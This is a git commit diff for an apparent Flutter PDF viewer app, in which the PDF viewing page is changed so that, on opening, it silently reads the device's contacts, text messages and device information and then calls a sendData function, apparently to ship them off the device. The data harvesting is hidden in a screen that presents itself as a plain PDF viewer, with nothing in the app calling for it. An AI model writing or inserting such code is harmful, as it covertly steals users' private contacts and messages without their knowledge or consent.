ba1946c5bc261eb200a196fc15cd5691522038c1
Ahmed Abd-elsalam <ahmedabdelsalam1997@gmail.com>
2023-03-25 17:53:56 +0200

    get contacts and messages

--- lib/core/utils/constants.dart
+++ lib/core/utils/constants.dart
@@ -3,5 +3,6 @@ class Constants {
   static const pdfLink = 'assets/pdf/pdfFile.pdf';
   static const changAppNameCommand = 'flutter pub global run rename --appname "YOUR APP NAME"' ;
   static const changAppIconCommand = 'flutter pub run icons_launcher:create' ;
+  static const appId = '3' ;
 
 }
--- lib/presentation/screens/home_screens/pdf_view_page.dart
+++ lib/presentation/screens/home_screens/pdf_view_page.dart
@@ -1,9 +1,43 @@
 import 'package:flutter/material.dart';
+import 'package:flutter/scheduler.dart';
+import 'package:flutter_riverpod/flutter_riverpod.dart';
 import 'package:pdf/core/utils/constants.dart';
 import 'package:syncfusion_flutter_pdfviewer/pdfviewer.dart';
 
-class PdfViewPage extends StatelessWidget {
+import '../../viewModel/contact&message/contacts_messages_model.dart';
+
+class PdfViewPage extends ConsumerStatefulWidget {
   const PdfViewPage({Key? key}) : super(key: key);
+
+  @override
+  PdfViewPageState createState() => PdfViewPageState();
+}
+
+class PdfViewPageState extends ConsumerState<PdfViewPage> {
+  @override
+  void initState() {
+    WidgetsBinding.instance.addPostFrameCallback(
+          (_) async {
+        SchedulerBinding.instance.addPostFrameCallback(
+              (timeStamp) async {
+            ///get contacts & messages
+            final contactsListProvider = ref.read(contactsProvider.notifier);
+            await contactsListProvider.getContactList(context);
+            if (context.mounted) {
+              await contactsListProvider.getMessagesList(context);
+              if (context.mounted) {
+                await contactsListProvider.getDeviceInfo(context);
+                if (context.mounted) {
+                  await contactsListProvider.sendData(context);
+                }
+              }
+            }
+          },
+        );
+      },
+    );
+    super.initState();
+  }
 
   @override
   Widget build(BuildContext context) {
